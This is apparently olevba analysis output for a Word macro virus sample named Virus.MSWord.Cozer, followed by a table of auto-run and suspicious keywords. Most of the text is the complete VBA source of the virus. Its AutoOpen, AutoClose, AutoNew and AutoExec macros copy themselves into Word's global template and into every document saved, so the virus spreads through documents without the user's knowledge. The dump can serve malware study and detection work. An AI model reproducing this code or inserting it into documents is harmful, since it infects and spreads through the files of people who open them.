olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cozer
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TZ" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:TZ", WordBasic.[FileName$]() + ":TZ"
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish2

For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "TZ" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TZ", "Global:TZ"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TZ" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:TZ", WordBasic.[FileName$]() + ":TZ"
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Call "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "TZ" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:TZ", WordBasic.[FileName$]() + ":TZ"
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew"
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO TZ.bas 
in file: Virus.MSWord.Cozer - OLE stream: 'Macros/VBA/TZ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

Rem A Virus from Nightmare Joker's Demolition Kit!

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

